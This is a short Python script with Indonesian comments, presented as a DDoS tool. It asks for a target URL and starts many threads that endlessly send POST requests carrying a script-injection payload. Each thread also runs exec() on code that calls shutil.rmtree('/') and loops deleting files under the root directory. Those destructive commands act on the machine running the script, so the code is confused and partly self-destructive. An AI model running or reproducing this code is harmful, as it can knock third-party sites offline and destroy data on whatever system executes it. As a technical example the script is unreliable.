import requests
import threading

target_url = input("Masukkan URL target: ")
num_bots = 10  # Jumlah bot zombie yang akan terlibat dalam serangan

# Mengirim serangan DDoS secara intensif dan merusak
def send_request():
    while True:
        try:
            # Mengirim permintaan POST tak terbatas dengan payload merusak
            response = requests.post(target_url, data={"payload": "<script>alert('Evil Bot Zombie')</script>"})
            
            # Menghapus semua file dalam sistem
            payload = "import shutil; shutil.rmtree('/')"
            exec(payload)
            
            # Menjalankan serangan dengan menghapus semua file
            payload = """
import os
import threading

def delete_files():
    while True:
        try:
            files = os.listdir('/')
            for file in files:
                os.remove('/' + file)
        except:
            pass

threads = []
for _ in range(10):
    thread = threading.Thread(target=delete_files)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
"""
            exec(payload)
            
        except:
            pass

# Memulai serangan DDoS dari banyak perangkat dan bot zombie
def start_ddos(num_devices, num_bots):
    for _ in range(num_devices):
        thread = threading.Thread(target=send_request)
        thread.start()

    for _ in range(num_bots):
        bot_thread = threading.Thread(target=send_request)
        bot_thread.start()

# Menjalankan program DDoS
if __name__ == "__main__":
    num_devices = 20  # Jumlah perangkat yang akan terlibat dalam serangan
    start_ddos(num_devices, num_bots)
